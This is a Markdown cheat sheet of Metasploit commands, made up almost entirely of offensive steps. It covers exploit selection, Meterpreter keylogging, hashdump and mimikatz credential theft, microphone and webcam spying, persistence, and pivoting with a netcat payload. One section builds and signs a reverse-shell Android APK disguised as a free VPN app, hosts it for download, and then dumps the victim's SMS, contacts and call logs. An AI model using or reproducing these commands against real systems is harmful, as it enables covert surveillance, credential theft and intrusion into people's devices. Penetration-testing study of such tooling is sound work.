# MetaSploit

## Initialize
- Database settings: 
  - ```systemctl start postgresql```
  - ```msfdb init```
- Run
  - ```msfconsole```  
- Workspace
  - Create: ```workspace -a nasa``` 
  - Delete: ```workspace -d nsa```
  - Show: ```workspace```  
  - Go to a workspace: ``` workspace nasa``` 
- Session
  - ```sessions -l```
  - ```sessions -i 2```  
- Informaion of a module 
  - ```info```  

## Search
- Example
  - ```search type:exploit cve:2019```
  - ```search type:auxiliary cve:2019```
  - ```search platform:windows description:chrome```
  - ```search platform:android description:2019```
  - ```search platform:exploit description:samsung```
- Nmap
  - ```nmap -sV -oX output.xml 192.168.3.5```
  - ```searchsploit --nmap output.xml```

## Auxiliary
- Example
  - ```use  auxiliary/scanner/mongodb/mongodb_login```
  - ```set rhosts 192.168.1.0/24```
  - ```run```
- Web scanner path 
  - ```/usr/share/metasploit-framework/modules/auxiliary/scanner/http/```


## Exploit
- Change default payload
  - ```show payloads``` 
  - ```set payload windows/meterpreter/reverse_tcp```
- Change target
  - ```show targets```
  - ```set target 1```
- Add new exploit
  - Download exploit from *"exploit-db"* that contains *"This module requires metasploit"* in text & ```Class MetasploitModule``` in code
  - Add file to ```/root/.msf4/local```
  - Restart OS & Postgresql

## Meterprete
- Common
  - ```pwd``` & ```lpwd```
  - ```ls``` & ```lls```
  - ```download h.txt```
  - ```upload```
- Show SAM file
  - ```hashdump```
- Spy
  - ```record_mic -d 60```
  - ```webcam_snap```
  - ```screenshot```
  - ```arp```
  - ```netstat```
  - ```keyscan_start``` & ```keyscan_dump``` & ```keyscan_stop```
  - ```getuid```
  - ```sysinfo```
  - ```ipconfig```
- Mimikatz
  - ```load mimikatz```
  - ```help```
- Pcap
  - ```load sniffer```
  - ```help```
  - ```sniffer interfaces```
  - ```sniffer_start z packet_buffer 40```
  - ```sniffer_dump z test.pcap```
  - ```sniffer_stop```
- PE
  - ```getsystem```
- Process & Migrate
  - ```ps```
  - ```migrate 596```
    - 596 is PID of *service.exe* or *explorer.exe* - DLL Hijack for persistant

## Persistance
- ```run persistence -U -i 20 -p 80 -r 10.20.14.203```

## msfvenom (Android)
- Create malware
  - ```msfvenum -p android/meterpreter/reverse_tcp -e shikata-ga-nai lhost=192.168.1.18 lport=443 R > /var/www/html/vpnfree.apk``` 
  - ```Keytool -genkey -v -keystore nss.keystore -alias nss -keyalg RSA -keysize 2048 -validity 100000```
  - ```jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore nss.keystore /var/www/html/vpnfree.apk nss```
- Listen in Kali (msfconsole)
  - ```use exploit/multi/handler```
  - ```set payload android/meterpreter/reverse_tcp```
  - ```set lhost 192.168.1.18```
  - ```set lport 443```
  - ```run -j```
- Exploit
  - ```sessions -l```
  - ```sessions -i 1```
  - ```geolocate```
  - ```dump_sms```
  - ```dump_calllog```
  - ```dump_contacts```
  - ```record_mic -d 15```
  - ```Webcam_snap```
  - ```webcam_snap -h```
  - ```webcam_list```
  - ```webcam_stream 2```
  - ```send_sms -h```
  - ```app_list```
    - show mobile app's 
  - ```app_run```
    - run one of above app 
  - ```shell```
    - open mobile shell (convert meterpreter shell to os shell)
     
     
## Pivot
- On victim, find a network interface with a different address from current subnet with ```ifconfig```
- Create a route between hacker and new victim
  - ```use post/windows/manage/autoroute```
  - ```set SESSION 1```
  - ```set SUBNET 10.20.15.0```
  - ```exploit```
- Connect to new victim
  - ```use exploit/multi/samba/usermap_script```
  - ```set RHOST 10.20.15.4```
  - ```set PAYLOAD cmd/unix/bind_netcat```
  - ```exploit```


